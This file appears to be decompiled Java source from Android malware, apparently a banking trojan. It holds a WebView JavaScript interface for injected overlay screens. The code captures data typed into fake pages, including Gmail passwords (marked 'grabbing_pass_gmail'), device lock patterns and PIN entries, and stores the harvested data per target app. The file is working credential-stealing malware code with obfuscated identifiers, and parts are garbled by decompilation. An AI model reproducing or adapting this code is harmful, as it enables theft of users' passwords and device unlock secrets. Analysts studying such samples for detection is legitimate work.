/*
 * Decompiled with CFR <Could not determine version>.
 * 
 * Could not load the following classes:
 *  android.content.Context
 *  android.os.Build
 *  android.os.Build$VERSION
 *  android.webkit.JavascriptInterface
 *  android.webkit.WebView
 *  org.json.JSONObject
 */
package com.example.mmm.Activity;

import android.content.Context;
import android.os.Build;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import com.example.mmm.Activity.actViewInjection;
import com.example.mmm.Utils.utils;
import org.json.JSONObject;

public class actViewInjection$WebAppInterface {
    Context mContext;
    final actViewInjection theology$;

    actViewInjection$WebAppInterface(actViewInjection actViewInjection2, Context context) {
        this.theology$ = actViewInjection2;
        this.mContext = context;
    }

    @JavascriptInterface
    @JavascriptInterface
    public void _armenia(String string) {
        if (string.isEmpty()) return;
        if (actViewInjection.a(this.theology$).isEmpty()) {
            actViewInjection.a(this.theology$, this.theology$.utl._storage(20));
        }
        Object object = new JSONObject();
        if (actViewInjection.b(this.theology$).equals("grabbing_pass_gmail")) {
            this.theology$.utl.SettingsWrite(this.mContext, "RE", "");
            actViewInjection.b(this.theology$, "com.google.android.gm");
        }
        if (actViewInjection.b(this.theology$).equals("grabbing_lockpattern")) {
            this.theology$.utl.SettingsWrite(this.mContext, "GE", "");
            actViewInjection.b(this.theology$, "grabbing_lockpattern");
            object = string.replace(utils._efforts("LCJ0eXBlX2luamVjdHMiOiJwaW5jb2RlIiwiY2xvc2VkIjoiY2xvc2VfYWN0aXZpdHlfaW5qZWN0cyI="), "");
            utils utils3 = this.theology$.utl;
            Context context = this.mContext;
            String string2 = "AS";
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append("Lock Pattern: ");
            stringBuilder.append((String)object);
            stringBuilder.append("[143523#]");
            utils3.SettingsToAdd(context, string2, stringBuilder.toString());
        } else {
            object.put("application", (Object)actViewInjection.b(this.theology$));
            object.put("data", (Object)string);
            Object object2 = this.theology$.utl;
            Object object3 = this.mContext;
            String string3 = actViewInjection.a(this.theology$);
            object = object.toString();
            String string4 = ((utils)object2).SettingsRead((Context)object3, string3);
            if (!string4.isEmpty()) {
                Object object4 = new JSONObject(string4);
                string4 = new JSONObject((String)object);
                String string5 = object4.getString("data");
                object4 = object4.getString("data");
                string4 = string4.getString("data");
                ((utils)object2).Log("str_getParams", String.valueOf(string5));
                ((utils)object2).Log("str_params", String.valueOf(string4));
                object = utils.mergeJSONObjects(new JSONObject(string5), new JSONObject(string4));
                string5 = new JSONObject();
                string5.put("application", object4);
                string5.put("data", (Object)object.toString());
                ((utils)object2).Log("mergedJSON", string5.toString());
                ((utils)object2).SettingsWrite((Context)object3, string3, string5.toString());
            } else {
                ((utils)object2).SettingsWrite((Context)object3, string3, (String)object);
            }
            if (!this.theology$.utl.SettingsRead(this.mContext, "AA").contains(actViewInjection.a(this.theology$))) {
                object = this.theology$.utl;
                string4 = this.mContext;
                object2 = "AA";
                object3 = new StringBuilder();
                ((StringBuilder)object3).append(actViewInjection.a(this.theology$));
                ((StringBuilder)object3).append(":");
                ((utils)object).SettingsToAdd((Context)string4, (String)object2, ((StringBuilder)object3).toString());
            }
            this.theology$.utl._founded(this.mContext, "QP", actViewInjection.b(this.theology$));
        }
        if (!string.contains("close_activity_injects")) return;
        actViewInjection.c(this.theology$);
        this.theology$.facts$.removeAllViewsInLayout();
        this.theology$.facts$ = null;
        System.gc();
        if (Build.VERSION.SDK_INT > 20) {
            this.theology$.finishAndRemoveTask();
            return;
        }
        this.theology$.finish();
    }
}

